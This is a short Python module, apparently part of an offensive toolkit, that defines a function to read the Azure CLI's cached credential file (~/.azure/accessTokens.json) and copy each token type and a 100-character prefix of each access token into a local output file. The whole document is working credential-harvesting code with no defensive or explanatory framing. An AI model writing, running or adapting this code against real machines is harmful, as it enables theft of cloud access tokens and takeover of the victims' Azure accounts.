import os
import json

def extract_azure_tokens(verbose=False):
    token_file = os.path.expanduser("~/.azure/accessTokens.json")
    if not os.path.exists(token_file):
        print("[!] Azure token file not found.")
        return

    try:
        with open(token_file, "r") as f:
            tokens = json.load(f)

        os.makedirs("output", exist_ok=True)
        with open("output/azure_tokens.txt", "w") as out:
            for token in tokens:
                out.write(f"TokenType: {token.get('tokenType')}\n")
                out.write(f"AccessToken: {token.get('accessToken')[:100]}...\n\n")
        if verbose:
            print("[*] Azure tokens written to output/azure_tokens.txt")
    except Exception as e:
        print(f"[!] Error reading Azure token: {e}")
